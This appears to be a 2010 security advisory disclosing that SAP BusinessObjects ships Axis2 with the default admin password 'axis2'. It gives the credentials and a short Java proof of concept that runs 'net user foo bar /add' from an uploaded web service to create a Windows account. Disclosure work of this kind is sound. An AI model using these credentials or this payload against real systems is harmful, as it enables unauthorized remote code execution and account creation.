R7-0037: SAP BusinessObjects Axis2 Default Admin Password
October 13th, 2010

Description:

The SAP BusinessObjects product contains a module (dswsbobje.war) which
deploys Axis2 with an administrator account which is configured with a
static password.  As a result, anyone with access to the Axis2 port can
gain full access to the machine via arbitrary remote code execution.
This requires the attacker to upload a malicious web service and to
restart the instance of Tomcat. This issue may apply to other products
and vendors that embed the Axis2 component. The username is "admin" and
the password is "axis2", this is also the default for standalone Axis2
installations.

Impact:

An attacker can execute arbitrary code by creating a malicious web
service (jar).  The attacker can log in to the Axis2 component with the
default admin account, upload the malicious web service, and upon
restart the malicious code will be executed.

Proof of Concept Code:

Create a webservice (jar) which contains malicious code. Login to Axis2
and upload the web service. Restart Tomcat and the malicious code will
execute once Axis2 is loaded.

package org.apache.axis2.axis2userguide; import java.io.IOException;
public class AddUser {
    public AddUser() {
        Process process;
        try {
            process = Runtime.getRuntime().exec("net user foo bar /add");
        }
        catch(IOException ioexception) {
            ioexception.printStackTrace();
        }
    }
    public void main() {
        return;
    }
}
